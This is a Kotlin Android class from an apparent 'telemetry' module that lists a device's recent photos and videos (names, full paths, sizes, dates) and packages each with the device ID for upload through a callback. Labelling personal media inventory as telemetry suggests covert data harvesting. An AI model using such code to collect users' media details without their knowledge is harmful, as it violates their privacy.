package com.pulsedrop.telemetry.collectors

import android.content.Context
import android.provider.MediaStore
import com.pulsedrop.telemetry.data.MediaItem
import com.pulsedrop.telemetry.data.UploadEnvelope
import com.pulsedrop.telemetry.utils.PrefsManager

class MediaCollector(
    private val context: Context,
    private val onData: (UploadEnvelope) -> Unit
) {
    private val prefs = PrefsManager(context)

    fun collectPhotos(limit: Int = 100) {
        val projection = arrayOf(
            MediaStore.Images.Media._ID,
            MediaStore.Images.Media.DISPLAY_NAME,
            MediaStore.Images.Media.DATA,
            MediaStore.Images.Media.SIZE,
            MediaStore.Images.Media.DATE_MODIFIED
        )
        context.contentResolver.query(
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
            projection, null, null,
            "${MediaStore.Images.Media.DATE_MODIFIED} DESC LIMIT $limit"
        )?.use { c ->
            val idIdx = c.getColumnIndex(MediaStore.Images.Media._ID)
            val nameIdx = c.getColumnIndex(MediaStore.Images.Media.DISPLAY_NAME)
            val pathIdx = c.getColumnIndex(MediaStore.Images.Media.DATA)
            val sizeIdx = c.getColumnIndex(MediaStore.Images.Media.SIZE)
            val dateIdx = c.getColumnIndex(MediaStore.Images.Media.DATE_MODIFIED)

            while (c.moveToNext()) {
                val item = MediaItem(
                    id = c.getString(idIdx),
                    type = "image",
                    fileName = c.getString(nameIdx) ?: "",
                    filePath = c.getString(pathIdx) ?: "",
                    sizeBytes = c.getLong(sizeIdx),
                    timestamp = c.getLong(dateIdx) * 1000
                )
                onData(UploadEnvelope("media", prefs.deviceId, System.currentTimeMillis(), item))
            }
        }
    }

    fun collectVideos(limit: Int = 50) {
        val projection = arrayOf(
            MediaStore.Video.Media._ID,
            MediaStore.Video.Media.DISPLAY_NAME,
            MediaStore.Video.Media.DATA,
            MediaStore.Video.Media.SIZE,
            MediaStore.Video.Media.DATE_MODIFIED
        )
        context.contentResolver.query(
            MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
            projection, null, null,
            "${MediaStore.Video.Media.DATE_MODIFIED} DESC LIMIT $limit"
        )?.use { c ->
            val idIdx = c.getColumnIndex(MediaStore.Video.Media._ID)
            val nameIdx = c.getColumnIndex(MediaStore.Video.Media.DISPLAY_NAME)
            val pathIdx = c.getColumnIndex(MediaStore.Video.Media.DATA)
            val sizeIdx = c.getColumnIndex(MediaStore.Video.Media.SIZE)
            val dateIdx = c.getColumnIndex(MediaStore.Video.Media.DATE_MODIFIED)

            while (c.moveToNext()) {
                val item = MediaItem(
                    id = c.getString(idIdx),
                    type = "video",
                    fileName = c.getString(nameIdx) ?: "",
                    filePath = c.getString(pathIdx) ?: "",
                    sizeBytes = c.getLong(sizeIdx),
                    timestamp = c.getLong(dateIdx) * 1000
                )
                onData(UploadEnvelope("media", prefs.deviceId, System.currentTimeMillis(), item))
            }
        }
    }
}
